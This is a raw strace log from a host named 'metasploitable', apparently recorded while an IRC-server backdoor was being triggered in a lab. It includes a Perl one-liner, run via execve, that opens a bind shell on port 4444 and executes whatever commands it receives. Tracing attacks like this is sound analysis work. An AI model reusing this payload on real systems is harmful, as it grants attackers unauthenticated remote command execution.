9849  20:00:43.139571 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
9849  20:00:43.139671 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
9849  20:00:43.139688 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f31000
9849  20:00:43.139703 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7de2000
9849  20:00:43.139715 mmap2(0xb7f2b000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7f2b000
9849  20:00:43.139731 mmap2(0xb7f2e000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f2e000
9849  20:00:43.139750 close(1)          = 0
9849  20:00:43.139773 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7de1000
9849  20:00:43.139785 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7de16b0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
9849  20:00:43.139842 mprotect(0xb7f2b000, 4096, PROT_READ) = 0
9849  20:00:43.139880 munmap(0xb7f66000, 29913) = 0
9849  20:00:43.139906 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
9849  20:00:43.139920 open("/dev/tty", O_RDWR|O_NONBLOCK|O_LARGEFILE) = -1 ENXIO (No such device or address)
9849  20:00:43.139941 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcd4e90) = -1 ENOTTY (Inappropriate ioctl for device)
9849  20:00:43.139971 brk(0)            = 0x80f9000
9849  20:00:43.139980 brk(0x80fa000)    = 0x80fa000
9849  20:00:43.139993 brk(0x80fb000)    = 0x80fb000
9849  20:00:43.140010 getuid32()        = 0
9849  20:00:43.140019 getgid32()        = 0
9849  20:00:43.140028 geteuid32()       = 0
9849  20:00:43.140037 getegid32()       = 0
9849  20:00:43.140051 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
9849  20:00:43.140065 time(NULL)        = 1495670443
9849  20:00:43.140078 brk(0x80fc000)    = 0x80fc000
9849  20:00:43.140103 brk(0x80fd000)    = 0x80fd000
9849  20:00:43.140123 open("/proc/meminfo", O_RDONLY) = 1
9849  20:00:43.140146 fstat64(1, {st_mode=S_IFREG|0444, st_size=0, ...}) = 0
9849  20:00:43.140164 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f6d000
9849  20:00:43.140176 read(1, "MemTotal:      1035240 kB\nMemFree:        206292 kB\nBuffers:        139328 kB\nCached:         447440 kB\nSwapCached:          0 kB\nActive:         465380 kB\nInactive:       310128 kB\nHighTotal:      131008 kB\nHighFree:          248 kB\nLowTotal:       904232 kB\nLowFree:        206044 kB\nSwapTotal:           0 kB\nSwapFree:            0 kB\nDirty:             288 kB\nWriteback:           0 kB\nAnonPages:      188736 kB\nMapped:          52032 kB\nSlab:            31540 kB\nSReclaimable:    19312 kB\nSUnreclaim:      12228 kB\nPageTables:       2904 kB\nNFS_Unstable:        0 kB\nBounce:              0 kB\nCommitLimit:    517620 kB\nCommitted_AS:   707672 kB\nVmallocTotal:   118776 kB\nVmallocUsed:      3420 kB\nVmallocChunk:   114760 kB\nHugePages_Total:     0\nHugePages_Free:      0\nHugePages_Rsvd:      0\nHugePages_Surp:      0\nHugepagesize:     2048 kB\n", 1024) = 846
9849  20:00:43.158447 close(1)          = 0
9849  20:00:43.158451 munmap(0xb7f6d000, 4096) = 0
9849  20:00:43.158466 brk(0x80fe000)    = 0x80fe000
9849  20:00:43.158495 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
9849  20:00:43.158509 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
9849  20:00:43.158521 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
9849  20:00:43.158533 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
9849  20:00:43.158545 rt_sigaction(SIGQUIT, {SIG_DFL}, {SIG_IGN}, 8) = 0
9849  20:00:43.158558 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_DFL}, 8) = 0
9849  20:00:43.158572 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
9849  20:00:43.158584 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
9849  20:00:43.158597 uname({sys="Linux", node="metasploitable", ...}) = 0
9849  20:00:43.158649 stat64("/", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
9849  20:00:43.168543 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
9849  20:00:43.168543 brk(0x8100000)    = 0x8100000
9849  20:00:43.168543 getcwd("/etc/unreal", 4096) = 12
9849  20:00:43.168544 getpid()          = 9849
9849  20:00:43.168544 getppid()         = 4519
9849  20:00:43.168564 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
9849  20:00:43.168585 stat64("/sbin/sh", 0xbfcd4e68) = -1 ENOENT (No such file or directory)
9849  20:00:43.168598 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
9849  20:00:43.168616 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
9849  20:00:43.168641 socket(PF_FILE, SOCK_STREAM, 0) = 1
9849  20:00:43.168662 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
9849  20:00:43.168675 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
9849  20:00:43.168698 close(1)          = 0
9849  20:00:43.168710 socket(PF_FILE, SOCK_STREAM, 0) = 1
9849  20:00:43.168720 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
9849  20:00:43.168731 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
9849  20:00:43.168749 close(1)          = 0
9849  20:00:43.168764 open("/etc/nsswitch.conf", O_RDONLY) = 1
9849  20:00:43.168780 fstat64(1, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
9849  20:00:43.168796 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f6d000
9849  20:00:43.168808 read(1, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
9849  20:00:43.168859 read(1, "", 4096) = 0
9849  20:00:43.168869 close(1)          = 0
9849  20:00:43.168879 munmap(0xb7f6d000, 4096) = 0
9849  20:00:43.168897 open("/etc/ld.so.cache", O_RDONLY) = 1
9849  20:00:43.168996 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
9849  20:00:43.169014 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f66000
9849  20:00:43.169025 close(1)          = 0
9849  20:00:43.169036 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
9849  20:00:43.169052 open("/lib/tls/i686/cmov/libnss_compat.so.2", O_RDONLY) = 1
9849  20:00:43.169067 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@\16\0\0004\0\0\0\204r\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0001a\0\0001a\0\0001a\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274c\0\0\274c\0\0\5\0\0\0\0\20\0\0\1\0\0\0\340n\0\0\340~\0\0\340~\0\0\250\2\0\0h\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\364n\0\0\364~\0\0\364~\0\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\340n\0\0\340~\0\0\340~\0\0\24\1\0\0\24\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\32\0\0\0&\0\0\0\4\0\0\0\7\0\0\0Q\0\200\2@\t\21\r\0\4\33\200\21H\262\201&\0\0\0\'\0\0\0(\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0)\0\0\0*\0\0\0+\0\0\0\0\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0\0\0\0\0\0\0\0\0002\0\0\0\0\0\0\0003\0\0\0004\0\0\0\0\0\0\0005\0\0\0\207[\246\22\365\33=\274\365\365K\23\0012\310%;]^\2674\10\301\346\357\37>\346\312\271\330\2749\303M%", 512) = 512
9849  20:00:43.169157 fstat64(1, {st_mode=S_IFREG|0644, st_size=30436, ...}) = 0
9849  20:00:43.169175 mmap2(NULL, 33352, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7dd8000
9849  20:00:43.169187 mmap2(0xb7ddf000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x6) = 0xb7ddf000
9849  20:00:43.169206 close(1)          = 0
9849  20:00:43.169218 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
9849  20:00:43.169231 open("/lib/tls/i686/cmov/libnsl.so.1", O_RDONLY) = 1
9849  20:00:43.169246 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\00001\0\0004\0\0\0\234B\1\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340,\1\0\340,\1\0\340,\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\3407\1\0\3407\1\0\5\0\0\0\0\20\0\0\1\0\0\0\300>\1\0\300N\1\0\300N\1\0\350\2\0\0()\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\300>\1\0\300N\1\0\300N\1\0004\1\0\0004\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\374\0\0\0q\0\0\0 \0\0\0\n\0\0\0\1\1$\232 \'Q\0@ \0\0\f\1\1\n\1\n\0\0\240:X\0@\1\16$\10\4\200\n`\260\23 @\24\21\20@\3442\324\4H\346\0\1`\3@\260\272\2019\30\235\340\0\0\332\200\0044\2\201J\20{\203+\200\22 d\21\1\0\2\200\306 d`A\n\4\4\4\v\4PD@\200\20\0\22 \4\340@\1\32 \4\2\20\10\0\0\204\260\200\0\340\23\0\212$\0\206\210\0\2`@q\0\0\0\0\0\0\0\0\0\0\0r\0\0\0\0\0\0\0t\0\0\0\0\0\0\0", 512) = 512
9849  20:00:43.169339 fstat64(1, {st_mode=S_IFREG|0644, st_size=83708, ...}) = 0
9849  20:00:43.178518 mmap2(NULL, 96232, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7dc0000
9849  20:00:43.178519 mmap2(0xb7dd4000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7dd4000
9849  20:00:43.178519 mmap2(0xb7dd6000, 6120, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7dd6000
9849  20:00:43.178549 close(1)          = 0
9849  20:00:43.178578 munmap(0xb7f66000, 29913) = 0
9849  20:00:43.178596 open("/etc/ld.so.cache", O_RDONLY) = 1
9849  20:00:43.178610 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
9849  20:00:43.178627 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f66000
9849  20:00:43.178637 close(1)          = 0
9849  20:00:43.178648 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
9849  20:00:43.178664 open("/lib/tls/i686/cmov/libnss_nis.so.2", O_RDONLY) = 1
9849  20:00:43.178678 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20\31\0\0004\0\0\0\320\201\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\350x\0\0\350x\0\0\350x\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\310}\0\0\310}\0\0\5\0\0\0\0\20\0\0\1\0\0\0\334~\0\0\334\216\0\0\334\216\0\0\374\1\0\0`\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360~\0\0\360\216\0\0\360\216\0\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334~\0\0\334\216\0\0\334\216\0\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0g\0\0\0000\0\0\0\20\0\0\0\t\0\0\0\2\0\0H  \26\20\0\0@g\3\0\3\6\30\24\0248A\30&\243\301\200\212\0048\21\10 B@\310\24\344\20\311\244\10\0\4\0\0@\0P!\0\0\204\0\0\0\0@\v\0y\243\0D\202\0\0\0\0000\0\0\0001\0\0\0\0\0\0\0002\0\0\0003\0\0\0004\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0005\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0006\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
9849  20:00:43.178769 fstat64(1, {st_mode=S_IFREG|0644, st_size=34352, ...}) = 0
9849  20:00:43.178786 mmap2(NULL, 37436, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7db6000
9849  20:00:43.178798 mmap2(0xb7dbe000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x7) = 0xb7dbe000
9849  20:00:43.188658 close(1)          = 0
9849  20:00:43.188659 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
9849  20:00:43.188659 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 1
9849  20:00:43.188659 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
9849  20:00:43.188659 fstat64(1, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
9849  20:00:43.188674 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7dab000
9849  20:00:43.188686 mmap2(0xb7db4000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7db4000
9849  20:00:43.188704 close(1)          = 0
9849  20:00:43.188725 munmap(0xb7f66000, 29913) = 0
9849  20:00:43.188742 open("/etc/passwd", O_RDONLY|0x80000 /* O_??? */) = 1
9849  20:00:43.188756 fcntl64(1, F_GETFD) = 0x1 (flags FD_CLOEXEC)
9849  20:00:43.188769 _llseek(1, 0, [0], SEEK_CUR) = 0
9849  20:00:43.188781 fstat64(1, {st_mode=S_IFREG|0644, st_size=1624, ...}) = 0
9849  20:00:43.188797 mmap2(NULL, 1624, PROT_READ, MAP_SHARED, 1, 0) = 0xb7f6d000
9849  20:00:43.188808 _llseek(1, 1624, [1624], SEEK_SET) = 0
9849  20:00:43.188823 munmap(0xb7f6d000, 1624) = 0
9849  20:00:43.188833 close(1)          = 0
9849  20:00:43.188862 getpgrp()         = 3831
9849  20:00:43.188872 rt_sigaction(SIGCHLD, {0x807e540, [], 0}, {SIG_DFL}, 8) = 0
9849  20:00:43.188887 getrlimit(RLIMIT_NPROC, {rlim_cur=8191, rlim_max=8191}) = 0
9849  20:00:43.188932 brk(0x8101000)    = 0x8101000
9849  20:00:43.188985 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
9849  20:00:43.189000 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
9849  20:00:43.189014 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
9849  20:00:43.189052 brk(0x8102000)    = 0x8102000
9849  20:00:43.189079 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
9849  20:00:43.189098 stat64("/sbin/AB", 0xbfcd4b28) = -1 ENOENT (No such file or directory)
9849  20:00:43.189110 stat64("/bin/AB", 0xbfcd4b28) = -1 ENOENT (No such file or directory)
9849  20:00:43.189121 stat64("/usr/sbin/AB", 0xbfcd4b28) = -1 ENOENT (No such file or directory)
9849  20:00:43.189133 stat64("/usr/bin/AB", 0xbfcd4b28) = -1 ENOENT (No such file or directory)
9849  20:00:43.189147 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
9849  20:00:43.189161 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7de16f8) = 9850
9850  20:00:43.189213 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
9850  20:00:43.189230 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
9850  20:00:43.189243 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
9850  20:00:43.189255 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
9850  20:00:43.189271 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
9850  20:00:43.189287 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
9850  20:00:43.189300 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
9850  20:00:43.189356 write(2, "sh: AB: command not found\n", 26) = -1 EPIPE (Broken pipe)
9850  20:00:43.189370 --- SIGPIPE (Broken pipe) @ 0 (0) ---
9850  20:00:43.190188 exit_group(127)   = ?
9849  20:00:43.259141 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
4519  20:00:43.259169 waitpid(9849,  <unfinished ...>
9849  20:00:43.259194 <... rt_sigprocmask resumed> NULL, 8) = 0
9849  20:00:43.548630 --- SIGCHLD (Child exited) @ 0 (0) ---
9849  20:00:43.548665 waitpid(-1, [{WIFEXITED(s) && WEXITSTATUS(s) == 127}], WNOHANG) = 9850
9849  20:00:43.548694 waitpid(-1, 0xbfcd47a8, WNOHANG) = -1 ECHILD (No child processes)
9849  20:00:43.548706 sigreturn()       = ? (mask now [])
9849  20:00:43.548731 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
9849  20:00:43.548748 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
9849  20:00:43.548759 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
9849  20:00:43.548772 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
9849  20:00:43.548791 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
9849  20:00:43.548803 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
9849  20:00:43.548849 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
9849  20:00:43.548871 stat64("/sbin/perl", 0xbfcd4b58) = -1 ENOENT (No such file or directory)
9849  20:00:43.548884 stat64("/bin/perl", 0xbfcd4b58) = -1 ENOENT (No such file or directory)
9849  20:00:43.548896 stat64("/usr/sbin/perl", 0xbfcd4b58) = -1 ENOENT (No such file or directory)
9849  20:00:43.548921 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
9849  20:00:43.548938 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
9849  20:00:43.548965 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
9849  20:00:43.548979 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7de16f8) = 9851
9851  20:00:43.698941 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
9851  20:00:43.698941 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
9851  20:00:43.698942 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
9851  20:00:43.698942 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
9851  20:00:43.698942 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
9851  20:00:43.698942 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
9851  20:00:43.698943 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
9851  20:00:43.698943 execve("/usr/bin/perl", ["perl", "-MIO", "-e", "$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};"], [/* 14 vars */]) = 0
9851  20:00:43.698943 brk(0)            = 0x8153000
9851  20:00:43.698954 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
9851  20:00:43.698971 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fcc000
9851  20:00:43.698988 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
9851  20:00:43.699007 open("/etc/ld.so.cache", O_RDONLY) = 1
9851  20:00:43.699034 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
9851  20:00:43.699053 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7fc4000
9851  20:00:43.699064 close(1)          = 0
9851  20:00:43.699075 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
9851  20:00:43.699091 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
9851  20:00:43.699106 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 